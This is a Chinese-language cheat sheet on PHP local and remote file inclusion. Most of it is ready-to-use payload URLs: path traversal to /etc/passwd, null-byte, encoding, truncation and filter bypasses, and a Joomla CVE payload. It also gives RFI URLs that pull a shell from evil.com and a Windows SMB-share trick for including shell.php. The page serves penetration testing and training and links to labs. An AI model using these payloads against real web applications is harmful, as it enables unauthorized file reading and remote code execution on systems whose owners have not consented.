# 文件包含

> 文件包含漏洞是指Web应用程序中的一种安全漏洞，尤其是在使用PHP开发的应用程序中较为常见，攻击者可以通过该漏洞包含一个文件，通常是由于缺乏对输入输出的适当清理所致。这种漏洞可能导致一系列恶意活动，包括代码执行、数据窃取和网站篡改。

## 概述

- [工具](#工具)
- [本地文件包含](#本地文件包含)
    - [空字节](#空字节)
    - [双重编码](#双重编码)
    - [UTF-8 编码](#utf-8-编码)
    - [路径截断](#路径截断)
    - [过滤器绕过](#过滤器绕过)
- [远程文件包含](#远程文件包含)
    - [空字节](#空字节-1)
    - [双重编码](#双重编码-1)
    - [绕过 allow_url_include](#绕过-allow_url_include)
- [实验室](#实验室)
- [参考文献](#参考文献)

## 工具

- [P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus) （2020年10月7日归档）- Kadimus 是一个用于检查和利用本地文件包含漏洞的工具。
- [D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite) - 完全自动化的本地文件包含漏洞利用工具（含反向Shell）和扫描器。
- [kurobeats/fimap](https://github.com/kurobeats/fimap) - Fimap 是一个小巧的Python工具，可以自动查找、准备、审计、利用以及搜索本地和远程文件包含漏洞。
- [lightos/Panoptic](https://github.com/lightos/Panoptic) - Panoptic 是一个开源渗透测试工具，通过路径遍历漏洞自动搜索和检索常见的日志和配置文件。
- [hansmach1ne/LFImap](https://github.com/hansmach1ne/LFImap) - 本地文件包含漏洞发现与利用工具。

## 本地文件包含

**文件包含漏洞** 应与 **路径遍历** 区分开来。路径遍历漏洞允许攻击者访问一个文件，通常利用目标应用程序实现的“读取”机制，而文件包含将导致任意代码的执行。

考虑一个基于用户输入包含文件的PHP脚本。如果未进行适当的清理，攻击者可以操纵 `page` 参数以包含本地或远程文件，从而导致未经授权的访问或代码执行。

```php
<?php
$file = $_GET['page'];
include($file);
?>
```

在以下示例中，我们包含 `/etc/passwd` 文件，请参阅 `目录与路径遍历` 部分以了解更有趣的文件。

```powershell
http://example.com/index.php?page=../../../etc/passwd
```

### 空字节

:warning: 在低于PHP 5.3.4的版本中，我们可以用空字节（`%00`）终止。

```powershell
http://example.com/index.php?page=../../../etc/passwd%00
```

**示例**: Joomla! 组件 Web TV 1.0 - CVE-2010-1470

```ps1
{{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00
```

### 双重编码

```powershell
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

### UTF-8 编码

```powershell
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```

### 路径截断

在大多数PHP安装中，超过 `4096` 字符的文件名会被截断，因此任何多余的字符都会被丢弃。

```powershell
http://example.com/index.php?page=../../../etc/passwd............[添加更多]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[添加更多]
http://example.com/index.php?page=../../../etc/passwd/./././././.[添加更多] 
http://example.com/index.php?page=../../../[添加更多]../../../../etc/passwd
```

### 过滤器绕过

```powershell
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

## 远程文件包含

> 远程文件包含（RFI）是一种漏洞类型，当应用程序包含远程文件时通常通过用户输入，但没有正确验证或清理输入时发生。

自PHP 5开始，默认配置下远程文件包含不起作用，因为 `allow_url_include` 已被禁用。

```ini
allow_url_include = On
```

大多数来自本地文件包含部分的过滤器绕过方法也可以用于远程文件包含。

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt
```

### 空字节

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt%00
```

### 双重编码

```powershell
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

### 绕过 allow_url_include

当 `allow_url_include` 和 `allow_url_fopen` 设置为 `Off` 时，在Windows系统上仍然可以使用 `smb` 协议包含远程文件。

1. 创建一个开放给所有人的共享文件夹。
2. 在文件 `shell.php` 中编写PHP代码。
3. 包含它 `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`

## 实验室

- [Root Me - 本地文件包含](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion)
- [Root Me - 本地文件包含 - 双重编码](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding)
- [Root Me - 远程文件包含](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)
- [Root Me - PHP - 过滤器](https://www.root-me.org/en/Challenges/Web-Server/PHP-Filters)

## 参考文献

- [CVV #1: 本地文件包含 - SI9INT - 2018年6月20日](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
- [利用PHP应用程序中的远程文件包含（RFI）漏洞并绕过远程URL包含限制 - Mannu Linux - 2019年5月12日](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
- [PHP在什么条件下易受攻击？ - 2015年4月13日 - Andreas Venieris](http://0x191unauthorized.blogspot.fr/2015/04/is-php-vulnerable-and-under-what.html)
- [LFI 速查表 - @Arr0way - 2016年4月24日](https://highon.coffee/blog/lfi-cheat-sheet/)
- [测试本地文件包含 - OWASP - 2017年6月25日](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
- [将LFI转换为RFI - Grayson Christopher - 2017年8月14日](https://web.archive.org/web/20170815004721/https://l.avala.mp/?p=241)